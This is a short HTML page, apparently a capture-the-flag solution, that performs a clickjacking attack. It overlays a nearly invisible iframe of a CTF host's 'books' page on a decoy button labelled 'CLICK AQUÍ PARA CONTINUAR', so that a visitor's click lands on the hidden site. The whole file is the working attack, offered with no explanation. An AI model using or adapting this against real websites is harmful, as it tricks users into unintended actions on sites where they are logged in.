<!DOCTYPE html>
<html>
<head>
    <title>Soporte Técnico - Books</title>
    <style>
        body { margin: 0; padding: 0; font-family: sans-serif; }
        
        .wrapper { position: relative; width: 100%; height: 100vh; }

        
        #objetivo {
            position: absolute;
            z-index: 1;
            top: 910px; 
            left: 50%;
            transform: translateX(-50%);
            width: 900px;
            height: 60px;
            cursor: pointer;
            background: red;
            border: none;
            color: white;
        }

        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 1200px; 
            border: none;
            z-index: 2;
            opacity: 0.0001; 
        }
    </style>
</head>
<body>

    <div class="wrapper">
        <button id="objetivo">CLICK AQUÍ PARA CONTINUAR</button>

        <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
    </div>

</body>
</html>
